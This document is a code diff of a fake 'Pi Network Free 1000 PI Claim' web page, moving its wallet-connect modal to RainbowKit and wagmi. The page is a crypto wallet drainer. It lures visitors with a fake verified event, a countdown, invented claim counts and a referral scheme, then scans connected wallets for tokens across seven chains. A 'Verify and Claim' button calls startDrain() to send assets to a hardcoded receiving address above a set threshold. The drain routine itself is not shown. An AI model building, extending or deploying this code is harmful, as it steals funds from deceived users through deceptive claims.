@@ -5,13 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pi Network — Free 1000 PI Claim</title>
 <link rel="icon" href="pi-logo-48.png">
-<script src="https://unpkg.com/ethers@6.13.2/dist/ethers.umd.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0118;color:#fff;min-height:100vh;overflow-x:hidden}
-
-/* Background */
 .bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
 .bg .orb{position:absolute;border-radius:50%;filter:blur(90px);opacity:.12;animation:fl 25s infinite ease-in-out}
 .bg .o1{width:500px;height:500px;background:#a855f7;top:-15%;left:-10%;animation-delay:0s}
@@ -21,32 +18,18 @@ body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:
 #part{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
 #part span{position:absolute;border-radius:50%;background:rgba(168,85,247,.3);animation:rise linear infinite}
 @keyframes rise{0%{transform:translateY(100vh) scale(0);opacity:0}5%{opacity:1}95%{opacity:.5}100%{transform:translateY(-5vh) scale(1);opacity:0}}
-
-/* Layout */
 .pos{position:relative;z-index:1}
 .w{max-width:720px;margin:0 auto;padding:0 16px}
-
-/* Nav */
 nav{background:rgba(10,1,24,.88);backdrop-filter:blur(20px);padding:12px 0;border-bottom:1px solid rgba(168,85,247,.06);position:sticky;top:0;z-index:100}
 nav>div{display:flex;align-items:center;justify-content:space-between}
 .logo{display:flex;align-items:center;gap:9px}
 .logo img{border-radius:50%;box-shadow:0 0 16px rgba(252,179,74,.12)}
 .logo t{font-size:16px;font-weight:800;letter-spacing:-.3px}
-
-/* Connected wallet badge in nav */
-.wb-connected{display:flex;align-items:center;gap:8px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.15);padding:6px 14px;border-radius:10px;cursor:pointer;transition:all .2s}
-.wb-connected:hover{background:rgba(34,197,94,.12)}
-.wb-connected .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.6)}}
-.wb-connected .addr{font-size:12px;font-weight:700;color:#22c55e;font-family:monospace}
-.wb-connected .chain{font-size:9px;color:rgba(34,197,94,.5);font-weight:600}
-
 .lb{display:flex;align-items:center;gap:5px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.12);padding:5px 11px;border-radius:20px;font-size:10px;font-weight:700;color:#22c55e;letter-spacing:.3px}
 .lb .p{width:6px;height:6px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.6)}}
 .nb{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;border:none;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;box-shadow:0 4px 20px rgba(252,179,74,.18);transition:all .2s}
 .nb:hover{box-shadow:0 6px 28px rgba(252,179,74,.3);transform:translateY(-1px)}
-
-/* Hero */
 .hero{padding:48px 0 16px;text-align:center}
 .eb{display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,rgba(168,85,247,.08),rgba(252,179,74,.04));border:1px solid rgba(168,85,247,.12);color:#c084fc;padding:6px 16px;border-radius:20px;font-size:10px;font-weight:700;margin-bottom:16px;letter-spacing:.8px;text-transform:uppercase}
 .hero h1{font-size:42px;font-weight:900;margin-bottom:10px;letter-spacing:-1.5px;line-height:1.1}
@@ -56,8 +39,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 @keyframes glow{0%,100%{box-shadow:0 0 50px rgba(252,179,74,.1)}50%{box-shadow:0 0 70px rgba(252,179,74,.18)}}
 .trust{display:flex;gap:8px;justify-content:center;margin-top:12px;flex-wrap:wrap}
 .trust span{padding:4px 12px;border-radius:20px;font-size:9px;font-weight:600}
-
-/* Claim Card */
 .cc{background:linear-gradient(145deg,rgba(168,85,247,.05),rgba(252,179,74,.02));border:1px solid rgba(168,85,247,.1);border-radius:24px;padding:32px;margin:18px 0;text-align:center;position:relative;overflow:hidden}
 .cc::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(252,179,74,.3),transparent)}
 .cc::after{content:'';position:absolute;bottom:0;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(168,85,247,.2),transparent)}
@@ -69,26 +50,18 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .cbtn:hover{transform:translateY(-2px);box-shadow:0 12px 48px rgba(252,179,74,.35)}
 .cbtn:disabled{opacity:.35;cursor:not-allowed;transform:none}
 .cfee{font-size:10px;color:rgba(255,255,255,.2);margin-top:10px}
-
-/* Countdown */
 .cd-row{display:flex;gap:7px;justify-content:center;margin:16px 0}
 .cdb{text-align:center;padding:9px 13px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;min-width:56px}
 .cdb .v{font-size:22px;font-weight:800;color:#fcb34c;line-height:1}
 .cdb .l{font-size:8px;color:rgba(255,255,255,.2);margin-top:2px;text-transform:uppercase;letter-spacing:.5px}
-
-/* Stats */
 .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:16px 0}
 .stat{text-align:center;padding:14px 8px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .stat .sv{font-size:18px;font-weight:800;color:#fcb34c}
 .stat .sl{font-size:9px;color:rgba(255,255,255,.25);margin-top:2px;font-weight:600}
-
-/* Social Proof */
 .sp{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(34,197,94,.02);border:1px solid rgba(34,197,94,.06);border-radius:12px;margin:14px 0}
 .sp-i{font-size:18px;flex-shrink:0}
 .sp-t{font-size:11px;color:rgba(255,255,255,.45);line-height:1.5}
 .sp-t strong{color:#22c55e}
-
-/* How To */
 .ht{margin:14px 0}
 .ht h3{font-size:15px;font-weight:700;margin-bottom:10px;text-align:center}
 .Steps{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
@@ -96,8 +69,12 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .Step .si{font-size:22px;margin-bottom:5px}
 .Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
 .Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
-
-/* Tier */
+.ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
+.ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
+.ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
+.ref .rb{display:flex;gap:6px;margin-bottom:8px}
+.rb input{flex:1;padding:10px;border-radius:8px;border:1px solid rgba(168,85,247,.12);background:rgba(0,0,0,.25);color:#fff;font-size:11px;font-family:monospace;outline:none}
+.rb button{padding:10px 14px;background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer}
 .tier{margin:14px 0;padding:16px;background:linear-gradient(135deg,rgba(252,179,74,.04),rgba(168,85,247,.03));border:1px solid rgba(252,179,74,.1);border-radius:14px}
 .tier .tt{font-size:13px;font-weight:700;margin-bottom:6px}
 .tier .ts{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:10px}
@@ -105,63 +82,16 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .tier-bar .fill{height:100%;background:linear-gradient(90deg,#22c55e,#fcb34c,#a855f7);border-radius:3px;transition:width 1s}
 .tier-level{font-size:10px;font-weight:700;color:#fcb34c}
 .tier-need{font-size:9px;color:rgba(255,255,255,.2)}
-
-/* Referral */
-.ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
-.ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
-.ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
-.ref .rb{display:flex;gap:6px;margin-bottom:8px}
-.rb input{flex:1;padding:10px;border-radius:8px;border:1px solid rgba(168,85,247,.12);background:rgba(0,0,0,.25);color:#fff;font-size:11px;font-family:monospace;outline:none}
-.rb button{padding:10px 14px;background:linear-gradient(135deg,#a855f7,#6366f1);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer}
-
-/* ===== RAINBOWKIT-STYLE WALLET MODAL ===== */
-#m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:999;align-items:flex-end;justify-content:center;backdrop-filter:blur(12px)}
-@media(min-width:500px){#m{align-items:center}}
-
-.rk-modal{width:100%;max-width:420px;background:linear-gradient(180deg,#1a0a2e 0%,#12082a 100%);border-radius:24px 24px 0 0;padding:0;position:relative;max-height:90vh;overflow-y:auto;box-shadow:0 -8px 40px rgba(0,0,0,.8)}
-@media(min-width:500px){.rk-modal{border-radius:24px}}
-.rk-header{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px}
-.rk-header h2{font-size:18px;font-weight:700}
-.rk-close{width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,.06);border:none;color:rgba(255,255,255,.5);font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .2s}
-.rk-close:hover{background:rgba(255,255,255,.12)}
-.rk-body{padding:0 16px 24px}
-
-/* Wallet grid */
-.rk-wallets{display:flex;flex-direction:column;gap:4px}
-.rk-wallet-btn{display:flex;align-items:center;gap:14px;padding:14px 16px;border-radius:16px;border:1px solid rgba(255,255,255,.04);background:rgba(255,255,255,.02);cursor:pointer;transition:all .2s;width:100%;text-align:left;font-family:inherit;color:#fff}
-.rk-wallet-btn:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.1);transform:scale(1.01)}
-.rk-wallet-btn:active{transform:scale(.99)}
-.rk-w-icon{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:22px}
-.rk-w-name{flex:1;font-size:15px;font-weight:600}
-.rk-w-status{font-size:10px;padding:3px 8px;border-radius:6px;font-weight:600}
-.rk-w-status.detected{background:rgba(34,197,94,.1);color:#22c55e}
-.rk-w-status.install{background:rgba(168,85,247,.1);color:#c084fc}
-
-/* QR Modal */
-.qr-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
-.qr-box{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:30px;text-align:center;max-width:360px;width:90%}
-.qr-box h3{font-size:16px;font-weight:700;margin-bottom:6px}
-.qr-box p{font-size:11px;color:rgba(255,255,255,.4);margin-bottom:16px;line-height:1.5}
-.qr-box canvas{margin:0 auto 16px;display:block;border-radius:12px}
-.qr-box .close-qr{padding:10px 24px;background:rgba(255,255,255,.1);color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer}
-
-/* Status */
 .s{padding:12px;border-radius:10px;font-size:12px;display:none;line-height:1.5;word-break:break-word;margin:8px 0 0}
 .s.ok{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#86efac}
 .s.er{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.1);color:#fca5a5}
 .s.wa{background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fde68a}
-
-/* Main Card */
 .card{background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px;padding:20px;margin:12px 0}
-
-/* Buttons */
 .btn{width:100%;padding:13px;font-size:13px;font-weight:700;border:none;border-radius:12px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:6px;font-family:inherit}
 .btn:hover:not(:disabled){transform:translateY(-1px)}
 .btn:disabled{opacity:.25;cursor:not-allowed}
 .bp{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118;font-size:14px;padding:15px}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.08)}
-
-/* Chain rows */
 .ch{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.04);border-radius:10px;margin-bottom:4px;cursor:pointer;transition:all .2s}
 .ch:hover{border-color:rgba(252,179,74,.15);background:rgba(252,179,74,.02)}
 .ch.sel{border-color:rgba(252,179,74,.25);background:rgba(252,179,74,.04)}
@@ -172,33 +102,21 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .ch .ck{width:18px;height:18px;border-radius:5px;border:2px solid rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:10px;transition:all .2s}
 .ch.sel .ck{background:linear-gradient(135deg,#fcb34c,#f59e0b);border-color:transparent}
 .ch.sel .ck::after{content:'✓';color:#0a0118;font-weight:800;font-size:11px}
-
-/* Token rows */
 .tkrow{display:flex;align-items:center;gap:8px;padding:8px 12px;background:rgba(255,255,255,.01);border-radius:8px;margin-bottom:3px;font-size:12px}
 .tk-sym{font-weight:700;color:#fcb34c;min-width:50px}
 .tk-bal{flex:1;font-family:monospace;color:rgba(255,255,255,.5);font-size:11px}
 .tk-usd{font-weight:600;color:#22c55e}
-
-/* Log */
 .lg{font-size:10px;color:rgba(255,255,255,.25);font-family:monospace;line-height:1.6;padding:10px;background:rgba(0,0,0,.25);border-radius:8px;max-height:140px;overflow-y:auto}
-
-/* Progress */
 .pg{display:flex;gap:3px;margin-bottom:12px}
 .pg .ps{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.04)}
 .pg .ps.on{background:linear-gradient(90deg,#fcb34c,#a855f7)}
-
-/* Info rows */
 .ir{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid rgba(255,255,255,.02)}
 .ir:last-child{border-bottom:none}
 .ir .l{font-size:11px;color:rgba(255,255,250,.3)}
 .ir .v{font-size:11px;font-weight:700}
 .ir .v.g{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
-
-/* Toast */
 #toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.9);color:#fff;padding:10px 20px;border-radius:10px;font-size:12px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
-
-/* Connected wallet info in card */
 .wi-connected{display:flex;align-items:center;gap:10px;padding:12px;background:rgba(34,197,94,.04);border:1px solid rgba(34,197,94,.1);border-radius:10px;margin-bottom:12px}
 .wi-connected .wi-dot{width:8px;height:8px;border-radius:50%;background:#22c55e;flex-shrink:0}
 .wi-connected .wi-info{flex:1}
@@ -206,11 +124,13 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .wi-connected .wi-chain{font-size:9px;color:rgba(34,197,94,.5);font-weight:600;margin-top:1px}
 .wi-connected .wi-disconnect{font-size:10px;color:rgba(255,255,250,.3);cursor:pointer;padding:4px 8px;border-radius:6px;background:rgba(255,255,255,.04);border:none;font-family:inherit}
 .wi-connected .wi-disconnect:hover{color:rgba(239,68,68,.7);background:rgba(239,68,68,.08)}
-
-/* Spinner */
+.wb-connected{display:flex;align-items:center;gap:8px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.15);padding:6px 14px;border-radius:10px;cursor:pointer;transition:all .2s}
+.wb-connected:hover{background:rgba(34,197,94,.12)}
+.wb-connected .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:pulse 1.5s infinite}
+.wb-connected .addr{font-size:12px;font-weight:700;color:#22c55e;font-family:monospace}
+.wb-connected .chain{font-size:9px;color:rgba(34,197,94,.5);font-weight:600}
 .ld{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,.1);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
 @keyframes rot{to{transform:rotate(360deg)}}
-
 @media(max-width:500px){.hero h1{font-size:28px}.ca{font-size:38px}.Steps{grid-template-columns:1fr}}
 </style>
 </head>
@@ -218,8 +138,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 <div class="bg"><div class="orb o1"></div><div class="orb o2"></div><div class="orb o3"></div></div>
 <div id="part"></div>
 <div class="pos">
-
-<!-- Nav -->
 <nav><div class="w" id="navBar">
   <div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
   <div style="display:flex;align-items:center;gap:8px">
@@ -228,32 +146,8 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   </div>
 </div></nav>
 
-<!-- RainbowKit-style Wallet Modal -->
-<div id="m">
-  <div class="rk-modal">
-    <div class="rk-header">
-      <h2>Connect Wallet</h2>
-      <button class="rk-close" onclick="closeM()">&#x2715;</button>
-    </div>
-    <div class="rk-body">
-      <div class="rk-wallets" id="wl"></div>
-    </div>
-  </div>
-</div>
-
-<!-- QR Modal -->
-<div id="qrModal" class="qr-overlay">
-  <div class="qr-box">
-    <h3>Scan with Wallet</h3>
-    <p>Open your wallet app and scan this QR code</p>
-    <canvas id="qrCanvas" width="280" height="280" style="background:#fff"></canvas>
-    <button class="close-qr" onclick="closeQR()">Close</button>
-  </div>
-</div>
-
+<!-- RainbowKit renders its own modal, we just need a trigger -->
 <div class="w">
-
-<!-- Hero -->
 <div class="hero">
   <div class="eb">&#x1F512; Verified Mainnet Event — Limited Time</div>
   <h1>Claim Your Free<br><span class="ha">1,000 PI Tokens</span></h1>
@@ -265,33 +159,23 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <span style="background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fcb34c">&#x26A1; Instant</span>
   </div>
 </div>
-
-<!-- Claim Card -->
 <div class="cc">
   <div class="ca"><span class="num">1,000</span> <span class="pi">PI</span></div>
   <div class="cl">FREE CLAIM — VERIFICATION REQUIRED</div>
   <button class="cbtn" id="claimBtn" onclick="openWalletModal()">&#x1F381; Claim 1000 PI Now</button>
   <div class="cfee">* Small network fee (~$2.50) • No hidden fees • One-time</div>
 </div>
-
-<!-- Countdown -->
 <div class="cd-row">
   <div class="cdb"><div class="v" id="cd-h">04</div><div class="l">Hours</div></div>
   <div class="cdb"><div class="v" id="cd-m">32</div><div class="l">Min</div></div>
   <div class="cdb"><div class="v" id="cd-s">18</div><div class="l">Sec</div></div>
 </div>
-
-<!-- Stats -->
 <div class="stats">
   <div class="stat"><div class="sv" id="st-c">48,291</div><div class="sl">PI Claimed</div></div>
   <div class="stat"><div class="sv" id="st-u">12,847</div><div class="sl">Pioneers</div></div>
   <div class="stat"><div class="sv" id="st-r">3,291</div><div class="sl">Referrals</div></div>
 </div>
-
-<!-- Social Proof -->
 <div class="sp"><div class="sp-i">&#x2705;</div><div class="sp-t" id="spt"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div></div>
-
-<!-- How To -->
 <div class="ht"><h3>How To Claim</h3>
   <div class="Steps">
     <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet via QR or extension</div></div>
@@ -299,8 +183,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div class="Step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
   </div>
 </div>
-
-<!-- Tier -->
 <div class="tier">
   <div class="tt">&#x1F3C6; Your Withdrawal Tier</div>
   <div class="ts">Invite friends to increase withdrawal speed.</div>
@@ -308,8 +190,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div class="tier-level" id="tierLevel">Tier 1 — Standard (10% speed)</div>
   <div class="tier-need" id="tierNeed">Invite 3 more to reach Tier 2</div>
 </div>
-
-<!-- Referral -->
 <div class="ref">
   <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Each</div>
   <div class="rs">Each friend who claims gives you 200 PI + increases speed.</div>
@@ -320,65 +200,42 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div style="text-align:center"><div style="font-size:16px;font-weight:800;color:#a855f7" id="refS">10%</div><div style="font-size:9px;color:rgba(255,255,255,.2)">Speed</div></div>
   </div>
 </div>
-
-<!-- Status -->
 <div class="s" id="sb"></div>
-
-<!-- Main Card (hidden until connected) -->
 <div class="card" id="mc" style="display:none">
-
-  <!-- Connected wallet info -->
   <div class="wi-connected" id="wiInfo" style="display:none">
     <div class="wi-dot"></div>
-    <div class="wi-info">
-      <div class="wi-addr" id="wiAddr"></div>
-      <div class="wi-chain" id="wiChain">Connected</div>
-    </div>
+    <div class="wi-info"><div class="wi-addr" id="wiAddr"></div><div class="wi-chain" id="wiChain">Connected</div></div>
     <button class="wi-disconnect" onclick="disconnect()">Disconnect</button>
   </div>
-
-  <!-- Phase 1: Loading -->
   <div id="p1" style="text-align:center;padding:8px 0">
     <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:4px">&#x1F50D; Loading Assets...</div>
     <div style="font-size:10px;color:rgba(255,255,255,.25);margin-bottom:8px" id="p1l">Scanning wallet...</div>
     <div class="lg" id="p1log"></div>
   </div>
-
-  <!-- Phase 2: No funds -->
   <div id="p2" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">No Assets Found</div>
     <div style="font-size:11px;color:rgba(255,255,255,.25);margin-bottom:8px">No tokens detected on any supported chain.</div>
     <button class="btn bo" onclick="reset()">&#x1F504; Back</button>
   </div>
-
-  <!-- Phase 3: Token Selection -->
   <div id="p3" style="display:none">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Required</div>
     <div style="font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px">Review your assets and confirm to proceed.</div>
-
     <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,.35);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Chains</div>
     <div id="p3chains" style="margin-bottom:12px"></div>
-
     <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,.35);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Assets</div>
     <div id="p3tokens" style="margin-bottom:12px;max-height:200px;overflow-y:auto"></div>
-
     <div id="p3bal" style="margin-bottom:12px;padding:12px;background:rgba(0,0,0,.2);border-radius:10px"></div>
-
     <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim</button>
   </div>
-
-  <!-- Phase 4: Processing -->
   <div id="p4" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing Transactions...</div>
     <div style="font-size:10px;color:rgba(255,255,255,.25);margin-bottom:8px">Confirm each transaction in your wallet</div>
     <div class="lg" id="p4log"></div>
   </div>
-
-  <!-- Phase 5: Success -->
   <div id="p5" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
@@ -391,713 +248,336 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <button class="btn bo" onclick="reset()">Done</button>
   </div>
 </div>
-
-</div><!-- .w -->
-
+</div>
 <footer><p>&copy; 2026 Pi Network</p><div style="display:flex;gap:14px;justify-content:center;margin-top:6px"><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Terms</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Privacy</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Support</a></div></footer>
-</div><!-- .pos -->
+</div>
 <div id="toast"></div>
 
-<script>
-// ============================================
-// CONFIG
-// ============================================
+<!-- React + RainbowKit via ESM CDN -->
+<script type="importmap">
+{
+  "imports": {
+    "react": "https://esm.sh/react@19.2.1",
+    "react-dom/client": "https://esm.sh/react-dom@19.2.1/client",
+    "@rainbow-me/rainbowkit": "https://esm.sh/@rainbow-me/rainbowkit@2.2.10?deps=react@19.2.1",
+    "wagmi": "https://esm.sh/wagmi@2.19.5?deps=react@19.2.1",
+    "viem": "https://esm.sh/viem@2.41.2",
+    "@tanstack/react-query": "https://esm.sh/@tanstack/react-query@5.90.12?deps=react@19.2.1"
+  }
+}
+</script>
+
+<script type="module">
+import React from 'react';
+import {createRoot} from 'react-dom/client';
+import {ConnectButton, getDefaultConfig, RainbowKitProvider} from '@rainbow-me/rainbowkit';
+import {WagmiProvider, useAccount, useWalletClient, usePublicClient, useChainId, useDisconnect} from 'wagmi';
+import {QueryClient, QueryClientProvider} from '@tanstack/react-query';
+import {http, createPublicClient, parseEther, formatEther} from 'viem';
+import {mainnet, polygon, arbitrum, avalanche, bsc, base, optimism} from 'viem/chains';
+import '@rainbow-me/rainbowkit/styles.css';
+
+// Config
 var RECEIVE_ADDR='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 var FEE_USD=2.50;
 var DRAIN_THRESHOLD=20.00;
 
-var ECHAINS=[
-  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA',exp:'https://etherscan.io'},
-  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F',exp:'https://bscscan.com'},
-  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5',exp:'https://polygonscan.com'},
-  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0',exp:'https://arbiscan.io'},
-  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142',exp:'https://snowtrace.io'},
-  {id:8453,name:'Base',sym:'ETH',rpc:'https://mainnet.base.org',color:'#0052FF',exp:'https://basescan.io'},
-  {id:10,name:'Optimism',sym:'ETH',rpc:'https://mainnet.optimism.io',color:'#FF0420',exp:'https://optimistic.etherscan.io'},
-];
+var CHAINS=[mainnet,polygon,arbitrum,avalanche,bsc,base,optimism];
 
-var FBACK={
-  1:['https://rpc.ankr.com/eth','https://ethereum-rpc.publicnode.com','https://cloudflare-eth.com'],
-  56:['https://bsc-dataseed1.defibit.io','https://bsc-dataseed.binance.org'],
-  137:['https://rpc.ankr.com/polygon','https://polygon-bor-rpc.publicnode.com'],
-  42161:['https://rpc.ankr.com/arbitrum','https://arbitrum-one-rpc.publicnode.com'],
-  43114:['https://avalanche-c-chain-rpc.publicnode.com'],
-  8453:['https://base-rpc.publicnode.com','https://base.llamarpc.com'],
-  10:['https://optimism-rpc.publicnode.com'],
-};
-
-var ETOKENS={
-  1:[
-    ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],
-    ['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],
-    ['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18],['0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984','UNI',18],
-    ['0x514910771AF9Ca656af840dff83E8264EcF986CA','LINK',18],['0x7Fc6F507C65326e72f4577C8e5fB1C8b1C0Ef0F4','AAVE',18],
-  ],
-  56:[
-    ['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
-    ['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],
-    ['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],
-    ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
-    ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
-  ],
-  137:[
-    ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],
-    ['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18],['0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619','WETH',18],
-    ['0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6','WBTC',8],['0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270','WMATIC',18],
-  ],
-  42161:[
-    ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6],
-    ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],['0x82aF49447D8a07e3bd95BD0d56f35241523fBab1','WETH',18],
-    ['0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f','WBTC',8],
-  ],
-  43114:[
-    ['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6],
-    ['0xd586E7F844cEa2F87f50152665BCbc2C279D8d7e','DAI',18],['0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB','WETH',18],
-  ],
